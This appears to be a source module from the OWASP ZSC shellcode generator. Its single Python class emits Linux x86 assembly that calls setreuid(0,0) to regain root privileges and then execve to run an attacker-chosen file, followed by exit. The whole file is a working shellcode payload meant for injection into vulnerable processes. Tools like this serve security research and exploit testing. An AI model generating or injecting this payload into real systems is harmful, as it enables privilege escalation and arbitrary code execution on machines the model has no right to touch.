"""
OWASP ZSC
# Status: Tested the module for ASM compile. ASM code is good
https://www.owasp.org/index.php/OWASP_ZSC_Tool_Project
https://github.com/zscproject/OWASP-ZSC
http://api.z3r0d4y.com/
https://groups.google.com/d/forum/owasp-zsc [ owasp_zsc[at]googlegroups[dot]com ]
"""
from owasp_zsc.new_cores import base_module, stack, alert


class Module(base_module.BasePayload):
    target_file = base_module.OptString("", "Target file to execute file")

    def generate(self):
        payload = "mov  $0x46, %al\n"
        payload += "xor  %ebx, %ebx\n"
        payload += "xor  %ecx, %ecx\n"
        payload += "int  $0x80\n"
        payload += stack.generate(self.target_file, '%ebx', 'string')
        payload += "mov  %esp, %ebx\n"
        payload += "xor  %eax, %eax\n"
        payload += "mov  $0xb, %al\n"
        payload += "int  $0x80\n"
        payload += "mov  $0x1, %al\n"
        payload += "mov  $0x1, %bl\n"
        payload += "int  $0x80"
        return payload

    def run(self):
        if not self.target_file:
            alert.error("Target file is required")
            return
        self.handle_generate(__name__)
